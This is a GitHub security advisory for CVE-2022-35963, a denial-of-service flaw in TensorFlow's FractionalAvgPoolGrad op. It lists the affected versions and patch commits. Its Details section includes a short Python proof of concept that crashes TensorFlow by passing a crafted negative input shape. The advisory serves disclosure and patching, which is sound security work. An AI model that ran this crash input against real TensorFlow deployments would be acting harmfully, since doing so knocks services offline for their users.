# [M] TensorFlow vulnerable to `CHECK` failures in `FractionalAvgPoolGrad`

## Summary
Severity: Medium
Advisory: GHSA-84jm-4cf3-9jfm
CVE: CVE-2022-35963
CWE: CWE-617
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-84jm-4cf3-9jfm
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
The implementation of `FractionalAvgPoolGrad` does not fully validate the input `orig_input_tensor_shape`. This results in an overflow that results in a  `CHECK` failure which can be used to trigger a denial of service attack.
```python
import tensorflow as tf

overlapping = True
orig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)
out_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)
row_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)
col_pooling_sequence = tf.constant(1, shape=[4], dtype=tf.int64)
tf.raw_ops.FractionalAvgPoolGrad(orig_input_tensor_shape=orig_input_tensor_shape, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)
```

### Patches
We have patched the issue in GitHub commit [03a659d7be9a1154fdf5eeac221e5950fec07dad](https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm
- https://nvd.nist.gov/vuln/detail/CVE-2022-35963
- https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
